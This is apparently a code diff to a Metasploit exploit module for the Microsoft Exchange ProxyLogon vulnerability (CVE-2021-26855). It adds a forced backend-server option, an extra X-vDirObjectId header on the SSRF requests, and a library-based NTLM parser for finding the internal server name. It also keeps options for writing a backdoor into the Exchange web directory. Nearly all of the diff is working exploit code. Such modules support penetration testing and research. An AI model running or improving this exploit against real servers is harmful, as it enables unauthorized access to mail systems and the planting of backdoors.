@@ -39,7 +39,8 @@ class MetasploitModule < Msf::Exploit::Remote
           'Jang (@testanull)', # Vulnerability analysis + PoC (https://twitter.com/testanull)
           'mekhalleh (RAMELLA Sébastien)', # Module author independent researcher (who listen to 'Le Comptoir Secu' and work at Zeop Entreprise)
           'print("")', # https://www.o2oxy.cn/3169.html
-          'lotusdll' # https://twitter.com/lotusdll/status/1371465073525362691
+          'lotusdll', # https://twitter.com/lotusdll/status/1371465073525362691
+          'Praetorian' # # Vulnerability analysis + PoC
         ],
         'References' => [
           ['CVE', '2021-26855'],
@@ -53,6 +54,7 @@ class MetasploitModule < Msf::Exploit::Remote
             'https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265'
           ],
           ['URL', 'https://www.o2oxy.cn/3169.html'],
+          ['URL', 'https://github.com/praetorian-inc/proxylogon-exploit'],
           ['URL', 'https://github.com/Zeop-CyberSec/proxylogon_writeup']
         ],
         'DisclosureDate' => '2021-03-02',
@@ -120,6 +122,7 @@ class MetasploitModule < Msf::Exploit::Remote
     ])
 
     register_advanced_options([
+      OptString.new('BackendServerName', [false, 'Force the name of the backend Exchange server targeted']),
       OptString.new('ExchangeBasePath', [true, 'The base path where exchange is installed', 'C:\\Program Files\\Microsoft\\Exchange Server\\V15']),
       OptString.new('ExchangeWritePath', [true, 'The path where you want to write the backdoor', 'owa\\auth']),
       OptString.new('IISBasePath', [true, 'The base path where IIS wwwroot directory is', 'C:\\inetpub\\wwwroot']),
@@ -176,7 +179,8 @@ class MetasploitModule < Msf::Exploit::Remote
       ctype: 'application/json; charset=utf-8',
       headers: {
         'msExchLogonMailbox' => patch_sid(exploit_info[1]),
-        'msExchTargetMailbox' => patch_sid(exploit_info[1])
+        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
+        'X-vDirObjectId' => (exploit_info[4][1]).to_s
       }
     )
     return '' if response.code != 200
@@ -195,18 +199,6 @@ class MetasploitModule < Msf::Exploit::Remote
     end
 
     sid
-  end
-
-  # modules/auxiliary/scanner/http/ntlm_info_enumeration.rb
-  def parse_ntlm_info(message, pattern, offset)
-    name_index = message.index(pattern, offset)
-    offset = name_index.to_i
-    size = message[offset + 2].unpack('C').first
-
-    return {
-      message: message[offset + 3, size].gsub(/\0/, ''),
-      new_offset: offset + size
-    }
   end
 
   def random_mapi_id
@@ -271,18 +263,10 @@ class MetasploitModule < Msf::Exploit::Remote
 
     if received.code == 401 && received['WWW-Authenticate'] && received['WWW-Authenticate'].match(/^NTLM/i)
       hash = received['WWW-Authenticate'].split('NTLM ')[1]
-      message = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_info].value
+      message = Net::NTLM::Message.parse(Rex::Text.decode_base64(hash))
+      dns_server = Net::NTLM::TargetInfo.new(message.target_info).av_pairs[Net::NTLM::TargetInfo::MSV_AV_DNS_COMPUTER_NAME]
 
-      # Retrieve Domain name subblock info
-      nb_domain = parse_ntlm_info(message, "\x02\x00", 0)
-      # Retrieve Server name subblock info
-      nb_name = parse_ntlm_info(message, "\x01\x00", nb_domain[:new_offset])
-      # Retrieve DNS domain name subblock info
-      dns_domain = parse_ntlm_info(message, "\x04\x00", nb_name[:new_offset])
-      # Retrieve DNS server name subblock info
-      dns_server = parse_ntlm_info(message, "\x03\x00", dns_domain[:new_offset])
-
-      return dns_server[:message].downcase
+      return dns_server.force_encoding('UTF-16LE').encode('UTF-8').downcase
     end
 
     fail_with(Failure::NotFound, 'No Backend server was found')
@@ -377,9 +361,14 @@ class MetasploitModule < Msf::Exploit::Remote
 
   # pre-authentication SSRF (Server Side Request Forgery) + impersonate as admin.
   def run_cve_2021_26855
-    print_status(message('Retrieving backend FQDN over RPC request'))
-    server_name = request_fqdn
-    print_status("Internal server name (#{server_name})")
+    if datastore['BackendServerName'] && !datastore['BackendServerName'].empty?
+      server_name = datastore['BackendServerName']
+      print_status("Internal server name forced to: #{server_name}")
+    else
+      print_status(message('Retrieving backend FQDN over RPC request'))
+      server_name = request_fqdn
+      print_status("Internal server name (#{server_name})")
+    end
 
     # get informations by autodiscover request.
     print_status(message('Sending autodiscover request'))
@@ -545,7 +534,8 @@ class MetasploitModule < Msf::Exploit::Remote
       ctype: 'application/json; charset=utf-8',
       headers: {
         'msExchLogonMailbox' => patch_sid(exploit_info[1]),
-        'msExchTargetMailbox' => patch_sid(exploit_info[1])
+        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
+        'X-vDirObjectId' => (exploit_info[4][1]).to_s
       }
     )
     return '' if response.code != 200
